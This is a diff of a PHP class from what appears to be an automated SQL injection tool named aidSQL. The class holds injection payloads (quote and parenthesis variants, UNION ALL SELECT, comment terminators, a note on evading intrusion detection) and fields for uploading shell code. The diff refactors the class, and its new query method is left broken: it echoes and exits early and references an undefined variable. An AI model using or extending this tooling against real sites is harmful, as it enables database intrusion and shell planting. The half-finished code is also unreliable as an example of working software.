@@ -6,54 +6,38 @@
 
 			//General Stuff
 
-			protected	$_logger									=	NULL;
-			protected 	$_httpAdapter							=	NULL;
-			protected	$_verbose								=	FALSE;
+			protected	$_logger						=	NULL;
+			protected 	$_httpAdapter				=	NULL;
+			protected	$_verbose					=	FALSE;
 
 			//This is a plugin that knows howto check if the injection has succeded
 			//The whole point is to the children classes to set the parser of their
 			//preference.
 
-			protected 	$_parser									=	NULL;
-
-			protected	$_config									=	NULL;
-			protected	$_isVulnerable							=	FALSE;
+			protected 	$_parser						=	NULL;
+			protected	$_config						=	NULL;
 
 			//Injection related stuff
 
-			protected 	$_injectionAttempts					=	40;
-			protected	$_fieldPayloads						=	array('',"'", "%'","')","%')");
-			protected	$_space							=	" ";	//This could be aswell /**/ for evading ids's
-			protected	$_injectionString						=	"UNION ALL SELECT";
-			private		$_fieldEqualityCharacter			=	'=';
-
-			protected	$_fieldWrapper							=	"CONCAT(0x7c,%value%,0x7c)";
-			protected	$_fieldDelimiter						=	',';
-
-			protected	$_commentPayloads						=	array(
-																						array("open"=>"/*","close"=>"/*"),
-																						array("open"=>"--","close"=>""),
-																						array("open"=>"#","close"=>""),
-																						array("open"=>"","close"=>"")
-																		);
-
-			private		$_order									=	array("field"=>"1","sort"=>"DESC");
-			private		$_limit									=	array();
+			protected 	$_injectionAttempts		=	40;
+			protected	$_fieldPayloads			=	array('',"'", "%'","')","%')");
+			protected	$_queryBuilder				=	NULL;
 
 			//Shell related stuff
-			protected	$_shellCode								=	NULL;
-			protected	$_shellFileName						=	NULL;
+			protected	$_shellCode					=	NULL;
+			protected	$_shellFileName			=	NULL;
 
 			//Post SQL Injection information
-			protected	$_affectedFields						=	array();
+			protected	$_affectedUrlVariable	=	array();
 
 			//A database schema object
-			protected	$_dbSchema								=	NULL;		
-
+			protected	$_dbSchema					=	NULL;		
 
 			public final function __construct(\aidSQL\http\Adapter $adapter,Array $config,\aidSQL\core\Logger &$log=NULL){
 
 				$url	=	$adapter->getUrl();
+
+				$this->_queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
 				if(!$url->getQueryAsArray()){
 					throw(new \Exception("Unable to perform injection without any request variables set in the http adapter!"));
@@ -66,46 +50,6 @@
 				}
 
 				$this->setConfig($config);
-
-			}
-
-			protected function setOrderBy(Array $fields){
-
-				$this->_order["field"]	=	$fields;
-
-			}
-
-			protected function setOrderSorting($sorting){
-				$this->_order["sort"]	=	$sorting;
-			}
-
-			protected function setFieldEqualityCharacter($equalityCharacter){
-
-				$this->_fieldEqualityCharacter	=	$equalityCharacter;
-
-			}
-
-			protected function setLimit(Array $limit){
-
-				$this->_limit	=	$limit;
-
-			}
-
-			protected function setFieldSpace($_space){
-
-				$this->_space	=	$_space;
-
-			}
-
-			protected function setInjectionString($string){
-
-				if(empty($string)){
-
-					throw(new \Exception("Injection string cant be empty, try something like UNION ALL SELECT"));
-
-				}
-
-				$this->_injectionString	=	$string;
 
 			}
 
@@ -190,24 +134,6 @@
 
 			}
 
-			public function setFieldWrapper($fieldWrapper){
-
-				if(!preg_match("%value%",$fieldWrapper)){
-
-					throw(new \Exception("Field wrapper must be set in order to wrap the field!"));
-
-				}
-
-				$this->_fieldWrapper = $fieldWrapper;
-
-			}
-
-			public function wrap($value){
-
-				return preg_replace("/%value%/",$value,$this->_fieldWrapper);
-
-			}
-
 			/**
 			*Checkout if the given URL by the HttpAdapter is vulnerable or not
 			*This method combines execution
@@ -263,8 +189,10 @@
 								$result			=	$this->query($variable,$injection);
 
 								if($this->_parser->analyze($result)){
-									die("YES");
+
+									$this->_affectedUrlVariable($variable);
 									return TRUE;
+
 								}
 
 							}
@@ -330,56 +258,43 @@
 			}
 
 
-			/**
-			*Good for decoupling execution with injection string generation
-			*/
+			protected function query(\aidSQL\core\QueryBuilder $builder,$variable=NULL){
 
-			protected function query($variable,$value){
+				echo $builder->getSQL();
+				die();
+				if(empty($variable)){
 
-				$url	=	$this->_httpAdapter->getUrl();
-				$url->addRequestVariable($variable,$value);
-				$this->_httpAdapter->setUrl($url);
+					if(empty($this->_affectedUrlVariable)){
 
-				if(isset($this->_config["all"]["decode-requests"]) && (bool)$this->_config["all"]["decode-requests"]){
+						throw (new \Exception("Cannot make query with no affected url variable set!"));
 
-					$this->log("QUERY: ".urldecode($url->getURLAsString()));
+					}else{
 
-				}else{
+						$variable	=	$this->_affectedUrlVariable;
 
-					$this->log("QUERY: ".$url->getURLAsString());
+					}
 
 				}
 
+				$this->log("QUERY: $sql");
+
+				$url	=	$this->_httpAdapter->getUrl();
+				$url->addRequestVariable($variable,$sql);
+				$this->_httpAdapter->setUrl($url);
+
 				try{
 
-					$content				=	$this->_httpAdapter->fetch();
+					$content = $this->_httpAdapter->fetch();
 
 					if($content===FALSE){
 
-						if(!$this->_config["all"]["http-ignore-errors"]){
-
-							throw(new \Exception("There was a problem processing the request! Got ". $this->_httpCode."!!!"));
-
-						}else{
-
-							$this->log("Got ". $this->_httpCode." proceeding anyways by user request ...");
-
-						}
+							$this->log("No content you have to modify the http adapter in order to retry on server error ...");
 
 					}
 
 				}catch(\Exception $e){
 
 					$this->log($e->getMessage());
-
-				}
-
-
-				$this->_httpCode	=	$this->_httpAdapter->getHttpCode();
-
-				if($this->_httpCode!==200){
-
-					return FALSE;
 
 				}
 
@@ -415,32 +330,6 @@
 
 			}
 
-			public function setAffectedVariable($var,$value){
-
-				$this->_affectedVariable = array("variable"=>$var,"value"=>$value);
-
-			}
-
-			/**
-			*Sets the affected field to inject further commands
-			*@param int $affectedField
-			*/
-
-			public function setAffectedField($affectedField=NULL){
-
-				if(empty($affectedField)){
-					throw (new \Exception("The affected field cant be empty"));
-				}
-
-				$this->_affectedField = $affectedField;
-
-			}
-
-			public function getAffectedVariable(){
-				return $this->affectedVariable;
-			}
-
-
 			/**
 			*This for now, only stands for outputting the results from URL execution to stdout
 			*/
@@ -457,68 +346,8 @@
 				$this->_parser = $parser;
 			}
 
-			public function getParser($requiredParser=NULL){
-
-				if(!is_null($requiredParser)){
-
-					$allParsers	= $this->listParsers();
-
-					$flag = FALSE;
-
-					foreach($allParsers as $theParser){
-
-						if(strtolower($theParser) == strtolower($requiredParser)){
-
-							$parserClassName	= "\\aidSQL\\parser\\$theParser";
-							$parserInstance	= new $parserClassName();
-							$this->setParser($parserInstance);
-							$flag = TRUE;
-							break;
-
-						}
-
-					}
-
-					if(!$flag){
-						throw (new \Exception("$requiredParser parser was not found in class/parser/TagMatcher.parser.php!"));
-					}
-
-				}
-
+			public function getParser(){
 				return $this->_parser;
-
-			}
-
-
-			/**
-			 *	Performs directory listing on the parser directory to find out which parsers
-			 * are available.
-			 * @return Array Parsers as string
-			 */
-
-			public function listParsers(){
-
-					$dir	= __CLASSPATH."/parser/";
-					$dp	= opendir($dir);
-
-					$baseParser = "Generic.parser.php";
-					$parserList = array();
-
-					while($file = readdir($dp)){
-
-						if(is_dir($file)||$file==$baseParser||preg_match("/^[.]/",$file)){
-							continue;
-						}
-
-						$class = substr($file,0,strpos($file,"."));
-						$parserList[] = $class;
-
-					}
-
-					closedir($dp);
-
-					return $parserList;
-
 			}
 
 			private function orderRequestVariables(Array $requestVariables){
@@ -539,7 +368,6 @@
 				return array("strings"=>$strVariables,"numeric"=>$numVariables);
 
 			}
-
 
 		}
 
